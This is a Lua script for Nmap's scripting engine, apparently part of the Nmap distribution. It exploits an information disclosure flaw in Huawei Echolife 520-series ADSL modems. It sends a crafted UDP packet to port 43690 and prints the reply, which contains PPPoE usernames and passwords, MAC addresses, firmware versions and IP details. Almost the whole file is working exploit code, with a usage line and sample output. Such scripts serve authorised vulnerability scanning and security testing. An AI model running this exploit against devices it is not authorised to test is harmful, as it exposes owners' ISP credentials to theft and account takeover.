local stdnse = require "stdnse"
local io = require "io"
local shortport = require "shortport"

description=[[
Tries to obtain the PPPoE credentials, MAC address, firmware version and IP
information of the aDSL modems Huawei Echolife 520, 520b, 530 and possibly
others by exploiting an information disclosure vulnerability via UDP.

The script works by sending a crafted UDP packet to port 43690 and then
parsing the response that contains the configuration values. This exploit
has been reported to be blocked in some ISPs, in those cases the exploit
seems to work fine in local networks.

Vulnerability discovered by Pedro Joaquin. No CVE assigned.

References:
* http://www.hakim.ws/huawei/HG520_udpinfo.tar.gz
* http://websec.ca/advisories/view/Huawei-HG520c-3.10.18.x-information-disclosure
]]

---
-- @usage
-- nmap -sU -p43690 --script huawei5xx-udp-info <target>
-- @output
-- PORT      STATE         SERVICE REASON
-- 43690/udp open|filtered unknown no-response
-- |_huawei5xx-udp-info: |\x10||||||||<Firmware version>|||||||||||||||||||||||||||||||<MAC addr>|||<Software version>||||||||||||||||||||||||||||||||||||||||||||| <local ip>|||||||||||||||||||<remote ip>||||||||||||||||||<model>|||||||||||||||<pppoe user>|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||<pppoe password>||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||\x01||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
--
-- @args huawei5xx-udp-info.timeout Timeout value. Default:3000ms
---

author = "Paulino Calderon"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"intrusive", "vuln"}

HUAWEI_UDP_PORT = 43690
PAYLOAD_LOCATION = "nselib/data/huawei-udp-info"

portrule = shortport.portnumber(HUAWEI_UDP_PORT, "udp", {"open", "open|filtered", "filtered"})

load_udp_payload = function()
  local payload_l = nmap.fetchfile(PAYLOAD_LOCATION)
  if (not(payload_l)) then
    stdnse.print_debug(1, "%s:Couldn't locate payload %s", SCRIPT_NAME, PAYLOAD_LOCATION)
    return
  end
  local payload_h = io.open(payload_l, "rb")
  local payload = payload_h:read("*a")
  if (not(payload)) then 
    stdnse.print_debug(1, "%s:Couldn't load payload %s", SCRIPT_NAME, payload_l)
    if nmap.verbosity()>=2 then
      return "[Error] Couldn't load payload"
    end
    return 
  end

  payload_h:flush()
  payload_h:close()
  return payload
end

---
-- send_udp_payload(ip, timeout)
-- Sends the payload to port and returns the response
---
send_udp_payload = function(ip, timeout, payload)
  local data
  stdnse.print_debug(2, "%s:Sending UDP payload", SCRIPT_NAME) 
  local socket = nmap.new_socket("udp")
  socket:set_timeout(tonumber(timeout))
  local status = socket:connect(ip, HUAWEI_UDP_PORT, "udp")
  if (not(status)) then return end
  status = socket:send(payload)
  if (not(status)) then return end

  status, data = socket:receive()
  if (not(status)) then 
    socket:close()
    return
  end
  socket:close()
  return data
end

---
-- Parses response to extract information. 
-- Only removes null bytes now.
---
parse_resp = function(resp)
  local out = resp:gsub("%z", "|")
  return out
end

---
--MAIN
---
action = function(host, port)
  local timeout = stdnse.get_script_args(SCRIPT_NAME..".timeout") or 3000
  local payload = load_udp_payload()
  local response = send_udp_payload(host.ip, timeout, payload)
  if response then
    return parse_resp(response)
  end
end
